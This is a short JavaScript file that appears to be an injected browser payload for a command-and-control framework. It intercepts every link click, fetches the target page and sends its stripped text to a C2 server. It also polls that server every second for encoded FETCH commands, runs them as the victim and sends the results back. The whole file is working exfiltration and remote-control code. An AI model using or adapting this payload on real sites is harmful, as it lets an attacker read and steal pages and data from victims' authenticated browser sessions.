// Hooks nonsense
document.addEventListener(`click`, e => handleATagClick(e));

async function handleATagClick(e) {
    // Handle
    const origin = e.target.closest(`a`);

    e.preventDefault()
    if (origin) {
        const response = await makeRequest('GET', origin.href)
        await sink(response)
        return false
    }
}

// Utility Nonsense
async function makeRequest(method, url) {
    const response = await fetch(url, {method: method})
    return await response.text()
}

async function sink(data){
    // Send the C2 server the latest page data
    const noScripts = data.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script\s*>/gi, " ")
    // alert("Sinking: "+ noScripts)
    await fetch(serverUrl + "/sink?r=" + encodeURI(noScripts))
    // await fetch(serverUrl + "/sink?r=" + bytesToBase64(new TextEncoder().encode(noScripts)))
}

function base64ToBytes(base64) {
  //   https://developer.mozilla.org/en-US/docs/Glossary/Base64#the_unicode_problem
  const binString = atob(base64);
  return Uint8Array.from(binString, (m) => m.codePointAt(0));
}

function bytesToBase64(bytes) {
  //   https://developer.mozilla.org/en-US/docs/Glossary/Base64#the_unicode_problem
  const binString = Array.from(bytes, (byte) =>
    String.fromCodePoint(byte),
  ).join("");
  return btoa(binString);
}

// C2 Nonsense

// TODO Set on payload init
const serverUrl = "http://localhost:5000"

async function getCommand() {
    const response = await fetch(serverUrl + "/commands")
    if (!response.ok) {
        throw new Error(`Response status: ${response.status}`)
    }

    const json = await response.json()
    const commands = json['data']
    for (const commandI in commands) {
        const commandBits = atob(commands[commandI]).split("|")
        const command = commandBits.shift()
        switch (command) {
            case 'FETCH':
                await handleFetch(commandBits)
        }

    }
}

async function handleFetch(data) {
    const method = data[0]
    const url = data[1]
    const response = await makeRequest(method, url)
    await sink(response)
}

setInterval(function () {
    getCommand();
}, 1000);